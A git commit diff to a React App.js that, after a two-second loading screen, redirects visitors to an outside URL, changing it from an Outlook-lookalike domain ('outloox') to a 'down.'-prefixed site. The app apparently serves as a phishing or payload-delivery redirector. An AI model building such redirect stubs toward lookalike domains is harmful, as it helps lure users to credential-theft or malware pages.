66713254694eea367147718dfaef35be290160ca
husknet <127146284+husknet@users.noreply.github.com>
2024-12-20 13:37:58 +0000

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://outloox.dinprima.ro/';
+            window.location.href = 'https://down.argetech.com.ar/';
         }, 2000);
 
         return () => clearTimeout(timer);
